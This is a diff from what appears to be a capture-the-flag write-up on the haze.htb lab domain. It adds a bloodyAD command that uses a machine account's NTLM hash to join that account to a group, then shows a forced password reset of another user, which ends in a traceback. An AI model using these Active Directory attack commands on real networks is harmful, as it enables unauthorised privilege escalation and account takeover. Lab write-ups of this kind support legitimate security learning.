@@ -502,6 +502,13 @@ So i have two options, i can either change the users password or i can abuse sha
 # Compromising `edward.martin`
 
 ```python
+bloodyAD --host dc01.haze.htb -d haze.htb -u 'haze-it-backup$' -p ':76da32697ff38bc7c9fa6289abf47940' add groupMember 'Support_Services' 'haze-it-backup$'
+
+[+] haze-it-backup$ added to Support_Services
+```
+Now ill add myself to the group itself
+
+```python
 bloodyAD --host dc01.haze.htb -d haze.htb -u 'haze-it-backup$' -p ':76da32697ff38bc7c9fa6289abf47940' set password 'edward.martin' 'Password123!'
 Traceback (most recent call last):
   File "/home/kali/.local/bin/bloodyAD", line 6, in <module>
